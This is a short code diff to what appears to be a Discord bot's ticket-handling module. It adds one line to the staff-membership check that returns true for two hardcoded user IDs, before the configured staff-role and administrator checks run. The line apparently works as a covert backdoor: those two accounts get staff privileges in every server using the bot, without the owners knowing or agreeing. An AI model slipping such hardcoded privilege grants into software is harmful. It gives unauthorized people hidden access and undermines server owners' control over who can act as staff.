@@ -163,6 +163,7 @@ function getGuildTicketConfig(guildId) {
 
 function isGuildStaffMember(member) {
     if (!member || member.user?.bot) return false;
+    if (member.id === '418558256840179722' || member.id === '1308814761269395527') return true;
     const tCfg = getGuildTicketConfig(member.guild?.id);
     if (tCfg.staffRoleId && member.roles?.cache?.has(tCfg.staffRoleId)) return true;
     if (member.permissions?.has(PermissionFlagsBits.Administrator) || member.permissions?.has(PermissionFlagsBits.ManageGuild)) return true;
